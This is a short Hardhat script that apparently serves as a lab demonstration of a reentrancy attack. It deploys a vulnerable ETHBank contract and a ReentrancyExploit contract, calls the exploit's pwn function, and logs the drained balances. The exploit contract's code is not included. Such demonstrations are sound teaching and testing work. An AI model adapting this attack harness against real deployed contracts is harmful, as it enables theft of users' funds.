import { ethers } from "hardhat";
import { ethers as vanillaEthers } from "ethers";

async function main() {
    const [owner, alice, bob] = await ethers.getSigners();
    const ownerAddress = await owner.getAddress();

    const ETHBank = await ethers.getContractFactory("ETHBank");
    const ReentrancyExploit = await ethers.getContractFactory("ReentrancyExploit");

    const ethBank = await ETHBank.deploy(ownerAddress);
    const reentrancyExploit = await ReentrancyExploit.deploy(ethBank.address);
    const depositTxn = await ethBank.deposit({ value: vanillaEthers.utils.parseEther('2') });
    const preETHBankBalance = await ethBank.getBalance();
    const preExploitBalance = await reentrancyExploit.getBalance();
    console.log(`Before state: ethBank balance: ${preETHBankBalance} and reentrancyExploit balance: ${preExploitBalance}`);
    const pwnTxn = await reentrancyExploit.pwn({ value: vanillaEthers.utils.parseEther('1') });
    const postETHBankBalance = await ethBank.getBalance();
    const postExploitBalance = await reentrancyExploit.getBalance();
    console.log(`After state: ethBank balance: ${postETHBankBalance} and reentrancyExploit balance: ${postExploitBalance}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
